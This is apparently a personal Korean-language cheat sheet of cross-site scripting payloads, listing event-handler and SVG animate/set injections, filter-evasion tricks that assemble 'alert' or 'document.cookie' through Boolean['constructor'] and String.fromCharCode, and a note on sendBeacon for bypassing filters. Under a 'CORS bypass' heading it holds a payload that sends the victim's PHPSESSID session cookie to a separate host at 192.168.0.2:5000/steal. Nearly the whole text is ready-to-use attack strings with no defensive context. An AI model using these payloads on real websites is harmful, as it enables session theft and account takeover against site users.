# XSS 페이로드
"><svg/onwheel=alert'1'> 


aa"><onpointover="alert(1)"><input%20types="hidden"%20value=" 


<div class="~~~ -hidden"> 태그에서 hidden 삭제 후 활성화된 창에서 입력
Boolean['constructor']('alert(1);')();

Boolean['constructor']('a' + 'l' + 'e' + 'r' + 't' + '(1)')();

Boolean['constructor']('a'+'l'+'e'+'r'+'t'+'('+'d'+'o'+'c'+'u'+'m'+'e'+'n'+'t'+'.'+'c'+'o'+'o'+'k'+'i'+'e'+')')();


navigator.sendBeacon 로 필터링 우회

&lt;a onwheel="Boolean.constructor(String.fromCharCode(110,97,...))();"&gt;asdf&lt;/a&gt;
# CORS 정책 우회
;const img=new Image();img.src='http://192.168.0.2:5000/steal?PHPSESSID='+document.cookie.match(/PHPSESSID=([^;]+)/)[1];//'

";Boolean[%27constructor%27](%27al%27%2b%27er%27%2b%27t(1)%27)();"


;window.open("https://naver.com");



# on이벤트= 이 아닌 xss 삽입

<animate attributeName="href" values="javascript:alert(1)" begin="0s" dur="0.1s" fill="freeze"/>

<set attributeName="href" to="javascript:alert(1)" begin="x.click"/>

<animate attributeName="xlink:href" values="javascript:alert(1)" begin="0s" fill="freeze"/>
